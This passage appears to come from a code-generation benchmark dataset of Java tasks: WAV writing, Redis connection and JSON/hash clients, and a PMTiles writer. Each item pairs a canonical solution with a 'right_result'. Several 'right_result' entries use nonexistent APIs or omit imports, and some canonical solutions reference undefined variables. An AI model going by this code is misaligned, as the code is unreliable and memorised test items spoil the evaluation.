header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(FORMAT_CHUNK_ID.getBytes());\n        header.putInt(FORMAT_CHUNK_LENGTH);\n        header.putShort(FORMAT_UNCOMPRESSED_PCM);\n        header.putShort((short)format.getChannels());\n        header.putInt((int)format.getSampleRate());\n        int frameByteRate = format.getChannels() * format.getSampleSizeInBits() / 8;\n        int byteRate = (int)(format.getSampleRate() * frameByteRate);\n        header.putInt(byteRate);\n        header.putShort((short)frameByteRate);\n        header.putShort((short)format.getSampleSizeInBits());\n        header.position(0);\n        return header;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class WaveWriter implements AutoCloseable {\n    private final AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 0;\n    private final long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException {\n        if (mFileChannel != null) {\n            mFileChannel.close();\n        }\n        mFileChannel = FileChannel.open(mFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n        writeHeader();\n        openDataChunk();\n    }\n\n    private void writeHeader() throws IOException {\n        ByteBuffer waveHeader = getWaveHeader(mAudioFormat);\n        mFileChannel.write(waveHeader);\n        ByteBuffer formatChunk = getFormatChunk(mAudioFormat);\n        mFileChannel.write(formatChunk);\n    }\n\n    private void openDataChunk() throws IOException {\n        mDataChunkOpen = true;\n        mDataChunkSize = 0;\n        mDataChunkSizeOffset = mFileChannel.position();\n        ByteBuffer dataHeader = getDataHeader();\n        mFileChannel.write(dataHeader);\n    }\n\n    private void closeDataChunk() throws IOException {\n        if (!mDataChunkOpen) return;\n        updateDataChunkSize();\n        mDataChunkOpen = false;\n    }\n\n    private void updateDataChunkSize() throws IOException {\n        mFileChannel.position(mDataChunkSizeOffset + 4);\n        ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.write(sizeBuffer);\n    }\n\n    private void updateTotalSize() throws IOException {\n        long totalSize = mDataChunkSize + 36; // RIFF header size is 12, fmt chunk is 24, data chunk header is 8\n        mFileChannel.position(4);\n        ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(totalSize - 8); // Subtract 8 for \"RIFF\" and the total size field itself\n        mFileChannel.write(sizeBuffer);\n    }\n\n    private void rollover() throws IOException {\n        closeDataChunk();\n        close();\n        updateFileName();\n        open();\n    }\n\n    private void updateFileName() {\n        String fileName = mFile.getFileName().toString();\n        int lastDotIndex = fileName.lastIndexOf('.');\n        String baseName = lastDotIndex > 0 ? fileName.substring(0, lastDotIndex) : fileName;\n        String extension = lastDotIndex > 0 ? fileName.substring(lastDotIndex) : \"\";\n        mFile = mFile.getParent().resolve(baseName + \"_\" + ++mFileRolloverCounter + extension);\n    }\n\n    public void close() throws IOException {\n        if (mFileChannel == null) return;\n        closeDataChunk();\n        mFileChannel.close();\n    }\n\n    public void close(Path path) throws IOException {\n        close();\n        Files.move(mFile, path);\n        mFile = path;\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException {\n        if (buffer.remaining() <= 0) return;\n\n        if (mMaxSize > 0 && mFileChannel.size() + buffer.remaining() >= mMaxSize) {\n            rollover();\n        }\n\n        mFileChannel.write(buffer);\n        mDataChunkSize += buffer.position();\n\n        updateTotalSize();\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(12);\n        buffer.put(\"RIFF\".getBytes());\n        buffer.putInt(0); // Placeholder for total size\n        buffer.put(\"WAVE\".getBytes());\n        return buffer;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(24);\n        buffer.put(\"fmt \".getBytes());\n        buffer.putInt(16); // Length of the format data\n        buffer.putShort((short) 1); // PCM format\n        buffer.putShort((short) format.getChannels());\n        buffer.putInt((int) format.getSampleRate());\n        buffer.putInt((int) (format.getSampleRate() * format.getFrameSize()));\n        buffer.putShort((short) format.getFrameSize());\n        buffer.putShort((short) (format.getSampleSizeInBits()));\n        return buffer;\n    }\n\n    public static ByteBuffer getDataHeader() {\n        ByteBuffer buffer = ByteBuffer.allocate(8);\n        buffer.put(\"data\".getBytes());\n        buffer.putInt(0); // Placeholder for data size\n        return buffer;\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long value) {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.putInt((int) value);\n        return buffer;\n    }\n}\n```"
  },
  {
    "Task_id": 340,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, with support for read preference configuration.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave deployment, configure read preferences, and properly close connections. It uses Lettuce's MasterReplica API for high availability.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to Redis master-slave setup\n\nMethods:\n- connectToMasterSlave(String sentinelUrl) -> void - Establishes a connection to Redis master-slave setup using the provided sentinel URL and configures read preference to prefer master\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create();\n        connection = MasterReplica.connect(redisClient, StringCodec.UTF8, RedisURI.create(sentinelUrl));\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisMasterReplicaConnection;\n\npublic class RedisMasterSlaveConnector {\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create(sentinelUrl);\n        connection = redisClient.connectMasterReplica();\n        connection.setReadFrom(ReadFrom.MASTER_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis JSON data structures using the Lettuce Redis client library. The class should handle connection management and provide methods for common JSON operations.\n\nClass Description: RedisJsonClient is a wrapper class for Lettuce Redis client that specializes in JSON operations. It manages Redis connections and provides synchronous methods to manipulate JSON data stored in Redis.\n\nAttributes:\n- client: RedisClient - The main Redis client instance for connection management\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisJsonClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- jsonGet(String key, JsonPath path) -> JsonValue - Retrieves JSON value at specified path from given key\n- jsonSet(String key, JsonPath path, JsonValue value) -> String - Sets JSON value at specified path for given key\n- jsonDel(String key, JsonPath path) -> Long - Deletes JSON value at specified path from given key\n- jsonArrlen(String key, JsonPath path) -> List<Long> - Gets length of JSON array at specified path\n- jsonArrpop(String key, JsonPath path) -> List<JsonValue> - Pops elements from JSON array at specified path\n- close() -> void - Shuts down the Redis connection and releases resources\n- createJsonValue(String value) -> JsonValue - Creates a new JsonValue from string\n- createJsonObject() -> JsonObject - Creates a new empty JsonObject\n- createJsonArray() -> JsonArray - Creates a new empty JsonArray",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.json.JsonParser;\nimport io.lettuce.core.json.JsonPath;\nimport io.lettuce.core.json.JsonValue;\n\npublic class RedisJsonClient {\n\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        RedisURI redisURI = RedisURI.Builder.redis(host).withPort(port).build();\n        client = RedisClient.create(redisURI);\n        syncCommands = client.connect().sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        List<JsonValue> values = syncCommands.jsonGet(key, path);\n        return values != null && !values.isEmpty() ? values.get(0) : null;\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path, value);\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path);\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path);\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.jsonArrpop(key, path);\n    }\n\n    public void close() {\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return syncCommands.getJsonParser().createJsonValue(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return syncCommands.getJsonParser().createJsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return syncCommands.getJsonParser().createJsonArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport com.google.gson.JsonArray;\nimport com.google.gson.JsonObject;\nimport com.google.gson.JsonPath;\nimport com.google.gson.JsonValue;\n\npublic class RedisJsonClient {\n    private final RedisClient client;\n    private final RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        this.client = RedisClient.create(\"redis://\" + host + \":\" + port);\n        StatefulRedisConnection<String, String> connection = client.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        return JsonValue.parse(syncCommands.jsonget(key, path.toString()));\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonset(key, path.toString(), value.toString());\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsondel(key, path.toString());\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonarrlen(key, path.toString());\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        List<String> result = syncCommands.jsonarrpop(key, path.toString());\n        List<JsonValue> jsonValues = new ArrayList<>();\n        for (String s : result) {\n            jsonValues.add(JsonValue.parse(s));\n        }\n        return jsonValues;\n    }\n\n    public void close() {\n        client.shutdown();\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return JsonValue.parse(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return new JsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return new JsonArray();\n    }\n}\n```"
  },
  {
    "Task_id": 344,
    "Instruction": "Task Description: Create a Java class that provides asynchronous Redis hash operations using the Lettuce client, including CRUD operations and field manipulation.\n\nClass Description: RedisHashInteraction is a utility class that encapsulates asynchronous Redis hash operations. It manages Redis connections and provides thread-safe methods for interacting with Redis hashes.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for creating connections\n- connection: StatefulRedisConnection<String, String> - The persistent connection to Redis\n- asyncCommands: RedisAsyncCommands<String, String> - The asynchronous command interface for Redis operations\n\nMethods:\n- Constructor(redisUri: String) -> void - Initializes the Redis client and establishes a connection using the provided URI\n- deleteKeys(keys: String...) -> CompletableFuture<Long> - Deletes one or more keys from Redis and returns the count of deleted keys\n- setHash(key: String, hash: Map<String, String>) -> CompletableFuture<Long> - Sets multiple hash fields at once for a given key\n- getHashField(key: String, field: String) -> CompletableFuture<String> - Retrieves the value of a specific field in a hash\n- getAllHashFields(key: String) -> CompletableFuture<Map<String, String>> - Retrieves all fields and values of a hash\n- incrementHashField(key: String, field: String, amount: long) -> CompletableFuture<Long> - Increments the integer value of a hash field by the given amount\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisHashInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisAsyncCommands<String, String> asyncCommands;\n\n    public RedisHashInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = redisClient.connect();\n        this.asyncCommands = connection.async();\n    }\n\n    public CompletableFuture<Long> deleteKeys(String... keys) {\n        return asyncCommands.del(keys).toCompletableFuture();\n    }\n\n    public CompletableFuture<Long> setHash(String key, Map<String, String> hash) {\n        return asyncCommands.hset(key, hash).toCompletableFuture();\n    }\n\n    public CompletableFuture<String> getHashField(String key, String field) {\n        return asyncCommands.hget(key, field).toCompletableFuture();\n    }\n\n    public CompletableFuture<Map<String, String>> getAllHashFields(String key) {\n        return asyncCommands.hgetall(key).toCompletableFuture();\n    }\n\n    public CompletableFuture<Long> incrementHashField(String key, String field, long amount) {\n        return asyncCommands.hincrby(key, field, amount).toCompletableFuture();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.api.sync.RedisHashCommands;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisHashInteraction {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n    private final RedisAsyncCommands<String, String> asyncCommands;\n\n    public RedisHashInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = redisClient.connect();\n        this.asyncCommands = connection.async();\n    }\n\n    public CompletableFuture<Long> deleteKeys(String... keys) {\n        return CompletableFuture.supplyAsync(() -> asyncCommands.del(keys).get());\n    }\n\n    public CompletableFuture<Long> setHash(String key, Map<String, String> hash) {\n        return CompletableFuture.supplyAsync(() -> asyncCommands.hmset(key, hash).get());\n    }\n\n    public CompletableFuture<String> getHashField(String key, String field) {\n        return CompletableFuture.supplyAsync(() -> asyncCommands.hget(key, field).get());\n    }\n\n    public CompletableFuture<Map<String, String>> getAllHashFields(String key) {\n        return CompletableFuture.supplyAsync(() -> asyncCommands.hgetall(key).get());\n    }\n\n    public CompletableFuture<Long> incrementHashField(String key, String field, long amount) {\n        return CompletableFuture.supplyAsync(() -> asyncCommands.hincrby(key, field, amount).get());\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 346,
    "Instruction": "Task Description: Create a Java class for managing Redis cluster connections and operations using Jedis and UnifiedJedis clients.\n\nClass Description: The RedisClusterManager class provides functionality to interact with a Redis cluster, including connection management, bucket creation/initialization, and performing Redis operations. It supports both JedisCluster and UnifiedJedis interfaces for cluster operations.\n\nAttributes:\n- jedisCluster: JedisCluster - The Jedis cluster client instance for Redis operations\n- unifiedJedisCluster: UnifiedJedis - The UnifiedJedis interface for Redis cluster operations (wraps jedisCluster)\n\nMethods:\n- RedisClusterManager(List<HostAndPort> shards) -> void - Constructor that initializes the Redis cluster connection using provided shards\n- createBucket(String key) -> byte[] - Converts a string key to UTF-8 bytes for Redis operations\n- initializeBucket(byte[] key) -> void - Placeholder for bucket initialization logic using the cluster client\n- performRedisOperations(byte[] key) -> void - Placeholder for performing CRUD operations on the cluster\n- closeConnections() -> void - Properly closes all Redis cluster connections\n- createShards(String host, List<Integer> ports) -> List<HostAndPort> - Static helper method to create shard configurations from host and ports",
    "Canonical_solution": "import java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.UUID;\n\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.UnifiedJedis;\n\npublic class RedisClusterManager {\n\n    private JedisCluster jedisCluster;\n    private UnifiedJedis unifiedJedisCluster;\n\n    public RedisClusterManager(List<HostAndPort> shards) {\n        this.jedisCluster = new JedisCluster(new HashSet<>(shards));\n        this.unifiedJedisCluster = this.jedisCluster;\n    }\n\n    public byte[] createBucket(String key) {\n        byte[] byteKey = key.getBytes(StandardCharsets.UTF_8);\n        return byteKey;\n    }\n\n    public void initializeBucket(byte[] key) {\n        // Initialize bucket logic using jedisCluster\n    }\n\n    public void performRedisOperations(byte[] key) {\n        // Perform CRUD operations using jedisCluster\n    }\n\n    public void closeConnections() {\n        try {\n            if (jedisCluster != null) {\n                jedisCluster.close();\n            }\n            if (unifiedJedisCluster != null) {\n                unifiedJedisCluster.close();\n            }\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    public static List<HostAndPort> createShards(String host, List<Integer> ports) {\n        List<HostAndPort> shards = new ArrayList<>();\n        for (Integer port : ports) {\n            shards.add(new HostAndPort(host, port));\n        }\n        return shards;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.UnifiedJedis;\nimport java.util.List;\n\npublic class RedisClusterManager {\n    private JedisCluster jedisCluster;\n    private UnifiedJedis unifiedJedisCluster;\n\n    public RedisClusterManager(List<HostAndPort> shards) {\n        this.jedisCluster = new JedisCluster(shards);\n        this.unifiedJedisCluster = new UnifiedJedis(jedisCluster);\n    }\n\n    public byte[] createBucket(String key) {\n        return key.getBytes();\n    }\n\n    public void initializeBucket(byte[] key) {\n        // Placeholder for bucket initialization logic\n    }\n\n    public void performRedisOperations(byte[] key) {\n        // Placeholder for performing CRUD operations on the cluster\n    }\n\n    public void closeConnections() {\n        if (jedisCluster != null) {\n            jedisCluster.close();\n        }\n    }\n\n    public static List<HostAndPort> createShards(String host, List<Integer> ports) {\n        return ports.stream()\n                .map(port -> new HostAndPort(host, port))\n                .toList();\n    }\n}\n```"
  },
  {
    "Task_id": 347,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, operations, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections and provides basic Redis operations. It handles connection lifecycle and ensures proper resource cleanup.\n\nAttributes:\n- client: RedisClient - The Redis client instance used for connections\n- redis: RedisCommands<String, String> - Synchronous Redis commands interface for string operations\n\nMethods:\n- setupClient(): void - Static method to initialize the default Redis client with default options\n- newRedisClient(): RedisClient - Static method to create a new Redis client with test resources (host and port should be defined elsewhere)\n- connect(): RedisCommands<String, String> - Establishes and returns a synchronous Redis connection\n- openConnection(): void - Opens a connection, configures client options, and ensures Redis is in a clean state by flushing data and killing any running scripts\n- closeConnection(): void - Closes the active Redis connection and releases resources",
    "Canonical_solution": "import io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.resource.DefaultRedisClient;\nimport io.lettuce.test.resource.TestClientResources;\n\npublic class RedisConnectionManager {\n\n    protected static RedisClient client;\n    protected RedisCommands<String, String> redis;\n\n    public static void setupClient() {\n        client = DefaultRedisClient.get();\n        client.setOptions(ClientOptions.create());\n    }\n\n    private static RedisClient newRedisClient() {\n        return RedisClient.create(TestClientResources.get(), RedisURI.Builder.redis(host, port).build());\n    }\n\n    public RedisCommands<String, String> connect() {\n        RedisCommands<String, String> connect = client.connect().sync();\n        return connect;\n    }\n\n    public void openConnection() throws Exception {\n        client.setOptions(ClientOptions.builder().build());\n        redis = connect();\n        boolean scriptRunning;\n        do {\n            scriptRunning = false;\n            try {\n                redis.flushall();\n                redis.flushdb();\n            } catch (RedisBusyException e) {\n                scriptRunning = true;\n                try {\n                    redis.scriptKill();\n                } catch (RedisException e1) {\n                    // Script might have ended between BUSY check and KILL attempt\n                }\n            }\n        } while (scriptRunning);\n    }\n\n    public void closeConnection() throws Exception {\n        if (redis != null) {\n            redis.getStatefulConnection().close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.resource.ClientResources;\n\npublic class RedisConnectionManager {\n    private static RedisClient client;\n    private RedisCommands<String, String> redis;\n\n    public static void setupClient() {\n        client = newRedisClient();\n    }\n\n    public static RedisClient newRedisClient() {\n        ClientResources resources = ClientResources.builder().build();\n        return RedisClient.create(resources, \"redis://127.0.0.1:6379\");\n    }\n\n    public RedisCommands<String, String> connect() {\n        StatefulRedisConnection<String, String> connection = client.connect();\n        return connection.sync();\n    }\n\n    public void openConnection() {\n        if (client == null) {\n            setupClient();\n        }\n        redis = connect();\n        flushAllAndKillScripts();\n    }\n\n    private void flushAllAndKillScripts() {\n        redis.flushall();\n        redis.scriptkill();\n    }\n\n    public void closeConnection() {\n        if (redis != null) {\n            ((StatefulRedisConnection<String, String>) ((io.lettuce.core.AbstractRedisClient) client).getConnection()).close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Create a Redis connection manager class in Java that handles connection pooling, resource management, and basic Redis operations.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Jedis connection pooling. It provides methods to get connections, execute commands, and properly close connections to ensure resource efficiency.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool instance that manages Redis connections\n\nMethods:\n- RedisConnectionManager(String host, int port, int timeout, String password) -> void - Constructor that initializes the connection pool with specified parameters\n- getConnection() -> Jedis - Retrieves a Redis connection from the pool\n- closeConnection(Jedis jedis) -> void - Returns a connection to the pool\n- closePool() -> void - Closes the entire connection pool\n- executeCommand(String key, String value) -> void - Executes a basic Redis SET/GET operation and prints the result",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, int timeout, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, timeout, password);\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis jedis) {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public void closePool() {\n        if (jedisPool != null && !jedisPool.isClosed()) {\n            jedisPool.close();\n        }\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Jedis jedis = getConnection()) {\n            jedis.set(key, value);\n            String result = jedis.get(key);\n            System.out.println(\"Redis operation result: \" + result);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, int timeout, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        jedisPool = new JedisPool(poolConfig, host, port, timeout, password);\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis jedis) {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public void closePool() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n\n    public void executeCommand(String key, String value) {\n        Jedis jedis = null;\n        try {\n            jedis = getConnection();\n            jedis.set(key, value);\n            String result = jedis.get(key);\n            System.out.println(\"Redis operation result: \" + result);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Java class that implements a writable tile archive using Java NIO's FileChannel for efficient file operations, supporting both file-based and in-memory storage options.\n\nClass Description: WriteablePmtiles is a class that provides functionality to write and manage tile archive data using Java NIO channels. It supports writing to either a physical file or an in-memory buffer, tracks bytes written, and handles proper resource cleanup.\n\nAttributes:\n- out: [SeekableByteChannel] - The channel used for writing data (either FileChannel or in-memory channel)\n- bytesWritten: [LongSupplier] - A supplier that provides the number of bytes written to the channel\n\nMethods:\n- newWriteToFile(Path path) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to a physical file at the specified path\n- newWriteToMemory(SeekableInMemoryByteChannel bytes) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to an in-memory byte channel\n- finish(TileArchiveMetadata tileArchiveMetadata) -> [void] - Finalizes the archive by writing metadata and directory information\n- bytesWritten() -> [long] - Returns the number of bytes written to the archive\n- close() -> [void] - Closes the underlying channel and releases system resources\n- DeduplicatingTileWriter.write(TileEncodingResult encodingResult) -> [void] - Inner class method that writes tile data to the channel\n- DeduplicatingTileWriter.close() -> [void] - Inner class method that performs any necessary cleanup (none in this implementation)",
    "Canonical_solution": "import com.onthegomap.planetiler.util.FileUtils;\nimport com.onthegomap.planetiler.util.SeekableInMemoryByteChannel;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.function.LongSupplier;\n\npublic final class WriteablePmtiles implements WriteableTileArchive {\n\n  private final SeekableByteChannel out;\n  private final LongSupplier bytesWritten;\n\n  private WriteablePmtiles(SeekableByteChannel channel, LongSupplier bytesWritten) throws IOException {\n    this.out = channel;\n    out.write(ByteBuffer.allocate(INIT_SECTION));\n    this.bytesWritten = bytesWritten;\n  }\n\n  public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n    return new WriteablePmtiles(\n      FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE),\n      () -> FileUtils.size(path)\n    );\n  }\n\n  public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) throws IOException {\n    return new WriteablePmtiles(bytes, () -> 0);\n  }\n\n  @Override\n  public void finish(TileArchiveMetadata tileArchiveMetadata) {\n    try {\n      out.write(ByteBuffer.wrap(jsonBytes));\n      out.write(ByteBuffer.wrap(directories.leaves));\n      out.position(0);\n      out.write(ByteBuffer.wrap(header.toBytes()));\n      out.write(ByteBuffer.wrap(directories.root));\n    } catch (IOException e) {\n      LOGGER.error(e.getMessage());\n    }\n  }\n\n  @Override\n  public long bytesWritten() {\n    return bytesWritten.getAsLong();\n  }\n\n  @Override\n  public void close() throws IOException {\n    out.close();\n  }\n\n  private class DeduplicatingTileWriter implements TileWriter {\n    @Override\n    public void write(TileEncodingResult encodingResult) {\n      try {\n        out.write(ByteBuffer.wrap(data));\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n      currentOffset += data.length;\n    }\n\n    @Override\n    public void close() {\n      // no cleanup needed.\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
